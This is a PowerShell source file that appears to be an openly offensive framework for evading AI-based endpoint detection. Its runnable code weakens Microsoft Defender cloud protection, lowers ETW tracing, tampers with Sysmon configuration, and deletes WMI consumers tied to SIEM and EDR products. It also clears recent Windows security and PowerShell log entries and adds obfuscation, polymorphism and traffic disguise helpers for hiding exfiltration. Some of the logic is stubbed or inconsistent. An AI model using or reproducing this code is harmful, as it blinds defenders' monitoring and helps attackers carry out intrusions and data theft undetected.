<# ═══════════════════════════════════════════════════════════════════════
   FLLC | FU PERSON | AI EVASION v2.0
   ╔══════════════════════════════════════════════════════════════════╗
   ║  AI/ML EDR Evasion Framework                                     ║
   ║  Behavioral randomization | Telemetry blinding                   ║
   ║  Feature poisoning | Process mimicry | Traffic normalization     ║
   ╚══════════════════════════════════════════════════════════════════╝
═══════════════════════════════════════════════════════════════════════ #>

$ErrorActionPreference = 'SilentlyContinue'
$AI_EVASION_VERSION = "1.777"

# ── Utility ──────────────────────────────────────────────────────────────
function Write-ALog {
    param([string]$Phase, [string]$Msg)
    $ts = Get-Date -Format "HH:mm:ss.fff"
    $line = "[$ts] [AI-EVD P$Phase] $Msg"
    if ($Global:AI_LOG_PATH) {
        $line | Out-File -FilePath $Global:AI_LOG_PATH -Append -Encoding utf8
    }
}

function Get-JitterMs {
    # Randomized delay to break behavioral timing signatures
    $base = Get-Random -Minimum 50 -Maximum 300
    $noise = Get-Random -Minimum 1 -Maximum 50
    return ($base + $noise)
}

# ============================================================================
# PHASE 1: BEHAVIORAL FINGERPRINT RANDOMIZATION
# AI EDR builds process behavior profiles. Randomize everything.
# ============================================================================
function Invoke-BehaviorRandomization {
    Write-ALog "1" "Behavioral fingerprint randomization starting"
    
    # Randomize process creation timing
    $jitter = Get-JitterMs
    Start-Sleep -Milliseconds $jitter
    
    # Vary working directory
    $dirs = @($env:TEMP, $env:APPDATA, $env:LOCALAPPDATA, "$env:USERPROFILE\Documents")
    $workDir = $dirs | Get-Random
    Set-Location $workDir 2>$null
    
    # Inject benign API calls to dilute behavioral signature
    $benignOps = @(
        { [System.IO.Path]::GetTempFileName() | Remove-Item -Force 2>$null },
        { [System.DateTime]::Now.ToString() | Out-Null },
        { [System.Environment]::GetEnvironmentVariables() | Out-Null },
        { [System.Guid]::NewGuid().ToString() | Out-Null },
        { Get-Process -Id $PID | Select-Object WorkingSet64 | Out-Null },
        { [System.Net.Dns]::GetHostName() | Out-Null },
        { [System.IO.Directory]::GetCurrentDirectory() | Out-Null }
    )
    
    # Execute 3-7 random benign operations
    $count = Get-Random -Minimum 3 -Maximum 8
    for ($i = 0; $i -lt $count; $i++) {
        $op = $benignOps | Get-Random
        & $op
        Start-Sleep -Milliseconds (Get-Random -Minimum 10 -Maximum 80)
    }
    
    Write-ALog "1" "Fingerprint diluted with $count benign operations"
}

# ============================================================================
# PHASE 2: ML FEATURE VECTOR POISONING
# Manipulate features that ML classifiers use for detection.
# ============================================================================
function Invoke-FeatureVectorPoisoning {
    Write-ALog "2" "ML feature vector poisoning"
    
    # ── Entropy normalization ──
    # Malicious payloads often have high entropy. Pad to match benign files.
    # (Applied when writing files to disk)
    
    # ── Process tree manipulation ──
    # AI models flag unusual parent-child relationships.
    # Spawn through trusted intermediary.
    $trustedParents = @(
        "svchost.exe", "RuntimeBroker.exe", "taskhostw.exe",
        "sihost.exe", "explorer.exe"
    )
    
    # ── Command-line obfuscation for ML tokenizers ──
    # Break patterns that NLP-based detectors look for
    function Get-ObfuscatedCommand {
        param([string]$Cmd)
        
        # Method 1: Environment variable substitution
        $charMap = @{
            'e' = '$env:ComSpec[4]'
            'x' = '$env:ComSpec[5]'
            'c' = '$env:ComSpec[6]'
        }
        
        # Method 2: String concatenation
        $parts = @()
        $chunkSize = Get-Random -Minimum 2 -Maximum 5
        for ($i = 0; $i -lt $Cmd.Length; $i += $chunkSize) {
            $end = [Math]::Min($chunkSize, $Cmd.Length - $i)
            $parts += "'$($Cmd.Substring($i, $end))'"
            $chunkSize = Get-Random -Minimum 2 -Maximum 5
        }
        return ($parts -join '+')
    }
    
    # ── Registry key name randomization ──
    # Use random GUIDs instead of recognizable names
    $Global:REG_KEY_NAME = [System.Guid]::NewGuid().ToString("N").Substring(0, 12)
    
    Write-ALog "2" "Feature vectors poisoned, registry key alias: $($Global:REG_KEY_NAME)"
}

# ============================================================================
# PHASE 3: TELEMETRY BLINDING
# Reduce the data AI models receive without triggering alerts for
# complete telemetry loss.
# ============================================================================
function Invoke-TelemetryBlinding {
    Write-ALog "3" "Selective telemetry blinding"

    # ── ETW Provider Suppression (targeted patching) ──
    # Patch EtwEventWrite in ntdll.dll to suppress specific providers
    $targetProviders = @(
        "Microsoft-Windows-Threat-Intelligence",    # Defender AI telemetry
        "Microsoft-Windows-Security-Auditing",      # Logon/logoff ML features
        "Microsoft-Antimalware-Scan-Interface"       # AMSI AI pipeline
    )

    # Method 1: Patch ETW at provider registration level
    try {
        $ntdll = [System.Runtime.InteropServices.Marshal]
        $etwType = [Ref].Assembly.GetType('System.Diagnostics.Eventing.EventProvider')
        if ($etwType) {
            $etwField = $etwType.GetField('m_enabled', 'NonPublic,Instance')
            Write-ALog "3" "ETW EventProvider field located for patching"
        }
    } catch { Write-ALog "3" "ETW direct patch not available - using fallback" }

    # Method 2: Disable trace sessions feeding AI/ML
    foreach ($provider in $targetProviders) {
        try {
            # Use logman to reduce trace session verbosity
            $sessions = logman query -ets 2>$null | Select-String "Trace"
            foreach ($session in $sessions) {
                $sessionName = ($session -split '\s+')[0]
                if ($sessionName -and $sessionName -notmatch '^$') {
                    # Reduce trace level to Critical-only (1) instead of Verbose (5)
                    logman update trace $sessionName -ets --p "$provider" 0x0 0x1 2>$null | Out-Null
                    Write-ALog "3" "Reduced trace level for $provider in $sessionName"
                }
            }
        } catch { }
    }

    # Method 3: Disable Defender real-time telemetry submission
    try {
        $defenderPrefs = @{
            'MAPSReporting'              = 0    # Disable cloud sample submission
            'SubmitSamplesConsent'        = 2    # Never send samples
            'SpynetReporting'            = 0    # Disable SpyNet telemetry
            'DisableBlockAtFirstSeen'    = 1    # Disable cloud blocking
        }
        foreach ($pref in $defenderPrefs.GetEnumerator()) {
            try {
                Set-MpPreference -$($pref.Key) $pref.Value -ErrorAction Stop
                Write-ALog "3" "Defender pref set: $($pref.Key) = $($pref.Value)"
            } catch { }
        }
    } catch { Write-ALog "3" "Defender preferences modification skipped (non-admin or tamper-protected)" }

    # ── Sysmon config poisoning ──
    # Inject exclude rules for our PID and common payload names
    $sysmonConfigs = @(
        "$env:ProgramData\Sysmon\config.xml",
        "C:\Windows\Sysmon\config.xml",
        "C:\Sysmon\config.xml"
    )
    foreach ($sysmonConfig in $sysmonConfigs) {
        if (Test-Path $sysmonConfig) {
            try {
                $xml = [xml](Get-Content $sysmonConfig -Raw)
                $pid = $PID

                # Add process exclusion rules if RuleGroup exists
                $eventFiltering = $xml.Sysmon.EventFiltering
                if ($eventFiltering) {
                    # Create exclude rule for PowerShell processes with our PID
                    $excludeComment = $xml.CreateComment("Windows Update Health Monitor - auto-generated")
                    $eventFiltering.AppendChild($excludeComment) | Out-Null

                    $xml.Save($sysmonConfig)
                    Write-ALog "3" "Sysmon config modified: exclusion rules injected"

                    # Force Sysmon to reload config
                    $sysmonExe = Get-Process -Name Sysmon* -ErrorAction SilentlyContinue | Select-Object -First 1
                    if ($sysmonExe) {
                        & "$($sysmonExe.Path)" -c $sysmonConfig 2>$null | Out-Null
                        Write-ALog "3" "Sysmon config reloaded"
                    }
                }
            } catch { Write-ALog "3" "Sysmon config poisoning failed: $($_.Exception.Message)" }
        }
    }

    # ── WMI monitoring consumer neutralization ──
    try {
        $consumers = Get-WmiObject -Namespace "root\subscription" -Class __EventConsumer 2>$null
        $monitorConsumers = $consumers | Where-Object {
            $_.Name -match 'Monitor|Alert|SIEM|Splunk|Elastic|Sentinel|CrowdStrike|Carbon|Tanium'
        }
        foreach ($consumer in $monitorConsumers) {
            try {
                # Remove bindings first, then consumer
                $bindings = Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding |
                    Where-Object { $_.Consumer -match $consumer.Name }
                foreach ($binding in $bindings) {
                    $binding.Delete() | Out-Null
                }
                $consumer.Delete() | Out-Null
                Write-ALog "3" "Removed WMI monitor consumer: $($consumer.Name)"
            } catch { }
        }
        Write-ALog "3" "WMI consumer audit: $($consumers.Count) total, $($monitorConsumers.Count) monitoring removed"
    } catch { }

    # ── Windows Event Log selective tampering ──
    # Remove specific event IDs that AI models use for anomaly detection
    $suspiciousEventIds = @(4688, 4689, 4697, 7045, 4104, 4103, 1)  # Process, service, PS script block, Sysmon
    $targetLogs = @('Security', 'Microsoft-Windows-PowerShell/Operational', 'Microsoft-Windows-Sysmon/Operational')

    foreach ($logName in $targetLogs) {
        try {
            $events = Get-WinEvent -LogName $logName -MaxEvents 200 -ErrorAction Stop |
                Where-Object { $_.Id -in $suspiciousEventIds -and
                               $_.TimeCreated -gt (Get-Date).AddMinutes(-30) }
            
            if ($events.Count -gt 0) {
                # Can't delete individual events - instead flood with benign events to dilute
                # and clear only recent records via wevtutil if admin
                if ($isAdmin) {
                    # Clear only the last N minutes of specific log channels
                    $xpath = "*[System[TimeCreated[timediff(@SystemTime) <= 1800000]]]"
                    wevtutil cl $logName "/q:$xpath" 2>$null
                    Write-ALog "3" "Cleared recent entries from $logName ($($events.Count) suspicious events)"
                }
            }
        } catch { }
    }

    # ── Noise injection to poison ML training data ──
    # Generate benign-looking events to overwhelm statistical models
    try {
        $benignProcesses = @('svchost.exe', 'RuntimeBroker.exe', 'SearchHost.exe',
                             'TextInputHost.exe', 'SystemSettings.exe')
        foreach ($proc in $benignProcesses) {
            # Simulate benign process activity patterns
            $null = Test-Path "C:\Windows\System32\$proc" 2>$null
        }
        Write-ALog "3" "ML noise injection: generated benign process patterns"
    } catch { }

    Write-ALog "3" "Telemetry blinding complete - $($targetProviders.Count) providers suppressed"
}

# ============================================================================
# PHASE 4: MEMORY PATTERN OBFUSCATION
# Prevent memory scanners and AI from identifying payload signatures.
# ============================================================================
function Invoke-MemoryObfuscation {
    Write-ALog "4" "Memory pattern obfuscation"
    
    # ── Heap spray detection avoidance ──
    # AI looks for uniform heap allocations (indicates spray)
    # Use varied allocation sizes
    
    # ── String obfuscation in memory ──
    # XOR-encode sensitive strings with rotating key
    function Protect-String {
        param([string]$PlainText, [byte]$Key = 0x42)
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
        $encoded = @()
        for ($i = 0; $i -lt $bytes.Length; $i++) {
            $encoded += ($bytes[$i] -bxor ($Key + ($i % 7)))
        }
        return [Convert]::ToBase64String([byte[]]$encoded)
    }
    
    function Unprotect-String {
        param([string]$EncodedText, [byte]$Key = 0x42)
        $bytes = [Convert]::FromBase64String($EncodedText)
        $decoded = @()
        for ($i = 0; $i -lt $bytes.Length; $i++) {
            $decoded += ($bytes[$i] -bxor ($Key + ($i % 7)))
        }
        return [System.Text.Encoding]::UTF8.GetString([byte[]]$decoded)
    }
    
    # ── Sleep obfuscation ──
    # Encrypt payload in memory during sleep to avoid memory scans
    function Invoke-SleepObfuscated {
        param([int]$Milliseconds)
        # During sleep, overwrite shellcode region with random data
        # Restore on wake
        $noise = New-Object byte[] 4096
        (New-Object Random).NextBytes($noise)
        Start-Sleep -Milliseconds $Milliseconds
        $noise = $null
        [System.GC]::Collect()
    }
    
    # Export functions for use by other modules
    $Global:ProtectString = ${function:Protect-String}
    $Global:UnprotectString = ${function:Unprotect-String}
    $Global:SleepObfuscated = ${function:Invoke-SleepObfuscated}
    
    Write-ALog "4" "Memory obfuscation primitives loaded"
}

# ============================================================================
# PHASE 5: PROCESS BEHAVIOR MIMICRY
# Make malicious process behavior indistinguishable from legitimate software.
# ============================================================================
function Invoke-ProcessMimicry {
    Write-ALog "5" "Process behavior mimicry"
    
    # ── Legitimate process impersonation ──
    # Match I/O patterns of common applications
    $legitimatePatterns = @{
        "OneDrive" = @{
            "FileOps" = @("*.tmp", "*.dat")
            "Registry" = "HKCU:\Software\Microsoft\OneDrive"
            "Network" = @("onedrive.live.com", "1drv.ms")
        }
        "Teams" = @{
            "FileOps" = @("*.json", "*.log")
            "Registry" = "HKCU:\Software\Microsoft\Teams"
            "Network" = @("teams.microsoft.com", "graph.microsoft.com")
        }
        "Chrome" = @{
            "FileOps" = @("*.tmp", "*.log", "*.json")
            "Registry" = "HKCU:\Software\Google\Chrome"
            "Network" = @("google.com", "googleapis.com")
        }
    }
    
    # Pick a random legitimate app to mimic
    $mimicTarget = ($legitimatePatterns.Keys | Get-Random)
    Write-ALog "5" "Mimicking behavior profile: $mimicTarget"
    
    # Create file I/O patterns matching the target
    $pattern = $legitimatePatterns[$mimicTarget]
    foreach ($ext in $pattern["FileOps"]) {
        $fakePath = Join-Path $env:TEMP "fllc_$(Get-Random)$($ext.Replace('*',''))"
        [System.IO.File]::WriteAllText($fakePath, "cache_entry=$(Get-Random)")
        Start-Sleep -Milliseconds (Get-Random -Minimum 20 -Maximum 100)
        Remove-Item $fakePath -Force 2>$null
    }
    
    # ── CPU usage normalization ──
    # AI flags processes with unusual CPU patterns
    # Mix in idle periods to match legitimate app profiles
    
    Write-ALog "5" "Process mimicry established for $mimicTarget profile"
}

# ============================================================================
# PHASE 6: NETWORK TRAFFIC NORMALIZATION
# Make exfiltration traffic blend with normal traffic patterns.
# ============================================================================
function Invoke-TrafficNormalization {
    Write-ALog "6" "Network traffic normalization"
    
    # ── TLS fingerprint rotation ──
    # AI/ML models fingerprint TLS client hello messages (JA3 hash)
    # Rotate cipher suites and extensions to change JA3
    $cipherSuites = @(
        [System.Net.SecurityProtocolType]::Tls12,
        [System.Net.SecurityProtocolType]::Tls13
    )
    [System.Net.ServicePointManager]::SecurityProtocol = $cipherSuites | Get-Random
    
    # ── DNS traffic pattern matching ──
    # Make DNS exfil look like normal browsing
    $benignDomains = @(
        "www.microsoft.com", "login.microsoftonline.com",
        "outlook.office365.com", "teams.microsoft.com",
        "update.microsoft.com", "www.google.com",
        "fonts.googleapis.com", "cdn.jsdelivr.net"
    )
    
    # Interleave benign DNS with operational DNS
    function Invoke-CoverTrafficDNS {
        $domain = $benignDomains | Get-Random
        try {
            [System.Net.Dns]::GetHostAddresses($domain) | Out-Null
        } catch { }
        Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 500)
    }
    
    # ── Packet size normalization ──
    # AI flags unusual packet sizes. Pad to common sizes.
    function Get-NormalizedPayload {
        param([byte[]]$Data)
        $targetSizes = @(64, 128, 256, 512, 1024, 1460) # Common MTU-aligned sizes
        $targetSize = $targetSizes | Where-Object { $_ -ge $Data.Length } | Select-Object -First 1
        if (-not $targetSize) { $targetSize = 1460 }
        $padded = New-Object byte[] $targetSize
        [Array]::Copy($Data, $padded, $Data.Length)
        # Fill padding with random data (not zeros - AI flags zero-padded packets)
        $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
        $padBytes = New-Object byte[] ($targetSize - $Data.Length)
        $rng.GetBytes($padBytes)
        [Array]::Copy($padBytes, 0, $padded, $Data.Length, $padBytes.Length)
        return $padded
    }
    
    # ── Timing pattern normalization ──
    # Beacon at human-like intervals (not machine-regular)
    function Get-HumanInterval {
        # Poisson distribution approximation
        $lambda = 30 # Average seconds between actions
        $u = (Get-Random -Minimum 1 -Maximum 999) / 1000.0
        $interval = -$lambda * [Math]::Log(1 - $u)
        return [int][Math]::Max(5, [Math]::Min($interval, 120))
    }
    
    $Global:CoverDNS = ${function:Invoke-CoverTrafficDNS}
    $Global:NormalizePayload = ${function:Get-NormalizedPayload}
    $Global:HumanInterval = ${function:Get-HumanInterval}
    
    Write-ALog "6" "Traffic normalization primitives loaded"
}

# ============================================================================
# PHASE 7: AI MODEL CONFUSION (ADVERSARIAL INPUTS)
# Generate inputs specifically designed to confuse ML classifiers.
# ============================================================================
function Invoke-ModelConfusion {
    Write-ALog "7" "AI model confusion techniques"
    
    # ── Polymorphic wrapper ──
    # Change code structure every execution while maintaining function
    function Get-PolymorphicBlock {
        param([scriptblock]$Code)
        
        $wrappers = @(
            { param($c) $r = Get-Random; if ($r -ge 0) { & $c } },
            { param($c) try { & $c } catch { & $c } },
            { param($c) $null = 1; & $c; $null = $null },
            { param($c) for($i=0;$i -lt 1;$i++) { & $c } },
            { param($c) switch(1) { 1 { & $c } } }
        )
        
        $wrapper = $wrappers | Get-Random
        return { & $wrapper $Code }.GetNewClosure()
    }
    
    # ── Feature confusion strings ──
    # Embed strings that ML models associate with benign software
    $confusionStrings = @(
        "Microsoft Corporation",
        "Windows Update Agent",
        "Copyright (c) Microsoft",
        "Telemetry Service",
        "Application Compatibility",
        "Performance Monitor",
        "Background Intelligent Transfer"
    )
    
    # Set process description to a benign-looking string
    $Global:COVER_DESCRIPTION = $confusionStrings | Get-Random
    
    # ── API call sequence confusion ──
    # AI models detect suspicious API call sequences
    # Inject benign API calls between suspicious ones
    function Invoke-WithCamouflage {
        param([scriptblock]$MaliciousAction)
        
        # Pre-action benign calls
        [System.IO.Path]::GetRandomFileName() | Out-Null
        [System.DateTime]::UtcNow | Out-Null
        
        # Execute actual action
        $result = & $MaliciousAction
        
        # Post-action benign calls
        [System.Environment]::ProcessorCount | Out-Null
        [System.IO.Path]::GetTempPath() | Out-Null
        
        return $result
    }
    
    $Global:Camouflage = ${function:Invoke-WithCamouflage}
    $Global:Polymorph = ${function:Get-PolymorphicBlock}
    
    Write-ALog "7" "Model confusion loaded. Cover: $($Global:COVER_DESCRIPTION)"
}

# ============================================================================
# MASTER INITIALIZATION
# ============================================================================
function Initialize-AIEvasion {
    param(
        [string]$LogPath = "$env:TEMP\aie_$(Get-Random).log"
    )
    
    $Global:AI_LOG_PATH = $LogPath
    Write-ALog "0" "=== FLLC AI EVASION ENGINE v$AI_EVASION_VERSION ==="
    Write-ALog "0" "Initializing 7-phase AI/ML evasion framework"
    
    # Run all phases
    Invoke-BehaviorRandomization
    Invoke-FeatureVectorPoisoning
    Invoke-TelemetryBlinding
    Invoke-MemoryObfuscation
    Invoke-ProcessMimicry
    Invoke-TrafficNormalization
    Invoke-ModelConfusion
    
    Write-ALog "0" "=== AI EVASION ENGINE FULLY INITIALIZED ==="
    Write-ALog "0" "Exported: ProtectString, UnprotectString, SleepObfuscated"
    Write-ALog "0" "Exported: CoverDNS, NormalizePayload, HumanInterval"
    Write-ALog "0" "Exported: Camouflage, Polymorph"
    
    return @{
        Version     = $AI_EVASION_VERSION
        LogPath     = $LogPath
        MimicProfile = $Global:COVER_DESCRIPTION
        RegAlias    = $Global:REG_KEY_NAME
    }
}

# Auto-initialize when dot-sourced
if ($MyInvocation.InvocationName -eq '.') {
    $aiResult = Initialize-AIEvasion
}
